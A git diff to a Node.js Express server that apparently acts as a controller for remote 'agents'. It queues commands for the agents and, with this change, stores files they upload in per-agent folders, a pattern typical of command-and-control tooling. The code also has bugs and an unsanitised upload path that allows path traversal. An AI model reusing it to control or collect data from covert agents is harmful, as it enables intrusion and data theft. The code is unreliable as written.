@@ -1,5 +1,6 @@
 const express = require('express');
 const bodyParser = require('body-parser');
+const fileUpload = require('express-fileupload');
 const process = require('process');
 const events = require('events');
 const fs = require('fs');
@@ -9,7 +10,9 @@ const prompt = require('./prompt');
 
 const eventEmitter = new events.EventEmitter();
 const app = express();
+
 const PORT = 3000;
+const CLIENTS_DIRECTORY = 'clients';
 
 const agents = {}; // connected agents
 
@@ -18,11 +21,28 @@ const agents = {}; // connected agents
 // support parsing of application/json POST data
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
+app.use(fileUpload());
 
 let newId = 0;
 app.post('/connect', (req, res) => {
   const agent = req.body;
-  console.log(`New agent ${JSON.stringify(agent)} with ID ${newId}`);
+  const agentJson = JSON.stringify(agent);
+
+  console.log(`New agent ${agentJson} with ID ${newId}`);
+
+  if (!fs.existsSync(CLIENTS_DIRECTORY)) {
+    fs.mkdirSync(CLIENTS_DIRECTORY);
+
+    if (!fs.existsSync(`${CLIENTS_DIRECTORY}/${newId}`)) {
+      fs.mkdirSync(`${CLIENTS_DIRECTORY}/${newId}`);
+    }
+  }
+
+  fs.writeFile(`${CLIENTS_DIRECTORY}/${newId}/client_info.json`, agentJson, (err) => {
+    if (err) {
+      console.log("Error saving the file!");
+    }
+  });
 
   agent.commands = [];
   agents[newId] = agent;
@@ -51,27 +71,24 @@ app.post('/command', (req, res) => {
   }
 });
 
-var savedFile = 0;
-app.post('/fileupload', (req, res) => {
-  console.log('Uploading file: ');
-  console.log(req.body);
+app.post('/upload', (req, res) => {
+  const { file } = req.files;
+  const { id } = req.body;
 
-  var file = req.body.data;
-  console.log(file);
-  fs.writeFile('saved/file' + savedFile, file, function(err){
-    if(err) throw err;
-    console.log('It is saved');
+  if (agents[id] == null) {
+    console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
+    return;
+  }
+
+  console.log(`Received file from ${id}`);
+
+  file.mv(`${CLIENTS_DIRECTORY}/${id}/${file.name}`, (err) => {
+    if (err) {
+      return res.status(500).send(err);
+    }
+
+    res.send('File uploaded!');
   });
-
-  res.send();
-  savedFile++;
-
-});
-
-app.post('/output', (req, res) => {
-  const { output } = req.body;
-  console.log('\x1b[32m%s\x1b[0m', output);
-  res.end();
 });
 
 // start server
@@ -103,13 +120,10 @@ eventEmitter.on('agent', (id, ...cmd) => {
 });
 
 eventEmitter.on('list', () => {
-  console.log('Agents connected are:');
-  for(var i =0; i <= newId; i++){
-    if(agents[i] != null){
-      console.log(`Agent ${i}: ${JSON.stringify(agents[i])} \n`);
-    }
+  console.log('Connected agents:');
+  for(var i = 0; i < agents.length; i++){
+    console.log(`Agent ${i}: ${JSON.stringify(agents[i])}\n`);
   }
-
 });
 
 eventEmitter.on('exit', () => {
